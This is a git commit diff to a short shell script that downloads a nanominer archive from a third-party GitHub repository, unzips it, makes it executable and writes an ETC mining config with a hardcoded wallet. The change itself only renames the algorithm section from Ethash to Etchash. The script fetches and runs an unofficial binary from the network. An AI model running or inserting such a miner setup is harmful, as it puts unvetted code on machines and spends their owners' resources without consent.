d222db235f8ec9bcaf2e203caa96183f3aa3196d
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-08 19:22:50 +0700

    Update runNanno.sh

--- runNanno.sh
+++ runNanno.sh
@@ -1,7 +1,7 @@
 wget -qO nano https://github.com/angkii/ngengBahan/raw/main/nanominer.zip
 unzip -qq nano
 chmod +x nanominer
-echo "[Ethash]
+echo "[Etchash]
 wallet = 0x11880b1cfe04907c5306222be1e09f4bbb480eb5
 coin = ETC
 rigName = $(echo $(shuf -i 1-9999 -n 1)-sty)
